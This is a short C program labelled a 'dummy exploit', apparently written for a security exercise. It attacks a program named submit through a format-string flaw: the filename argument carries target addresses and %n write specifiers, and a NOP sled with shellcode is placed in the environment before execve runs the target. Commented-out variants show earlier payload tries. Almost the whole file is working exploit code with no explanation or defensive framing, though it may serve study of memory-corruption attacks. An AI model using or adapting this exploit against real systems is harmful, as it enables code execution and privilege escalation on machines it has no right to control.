/*
 * dummy exploit program
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include </usr/local/src/shellcode.h>

#define SUBMIT "/usr/local/bin/submit"

#define ADDRS "\x3f\xdc\xbf\xff\x3e\xdc\xbf\xff\x3d\xdc\xbf\xff\x3c\xdc\xbf\xff"
#define BYTE1 "%000c%101$n"
#define BYTE2 "%000c%102$n"
#define BYTE3 "%000c%103$n"
#define BYTE4 "%000c%104$nAAA"
//#define EVIL ADDRS BYTE1 BYTE2 BYTE3 BYTE4
//#define EVIL ADDRS BYTE1 "aaaaaaaaaaa" "aaaaaaaaaaa" "aaaaaaaaaaaaaa"
//#define EVIL "\x3f\xdc\xbf\xff%99$p"

// OKAY UPPER
//#define EVIL "\x6e\xdc\xbf\xff%65467c%100$n__"

//#define EVIL "\x5e\xdc\xbf\xff\x5c\xdc\xbf\xff%56792c%101$n%08671c%100$n_"
#define EVIL "\x5e\xdc\xbf\xff\x5c\xdc\xbf\xff%56792c%101$n%08671c%0100$n"
//%65462c%100$n_"

int main(int argc, char **argv) {
	char *args[4], *ptr;
	char *envs[2];
	char *evil = EVIL;
	char buf[512];
	int slen = strlen(shellcode);

	fclose(fopen(evil, "w"));

	args[0] = SUBMIT;
	args[1] = evil;
	args[2] = "whatever";
	args[3] = NULL;

	memset(buf, 0x90, 512);
	ptr = buf + 128;
	memcpy(ptr, shellcode, slen);
	//((void(*)()) buf)();

	envs[0] = buf;
	envs[1] = NULL;

	execve(SUBMIT, args, envs);
	return 0;
}
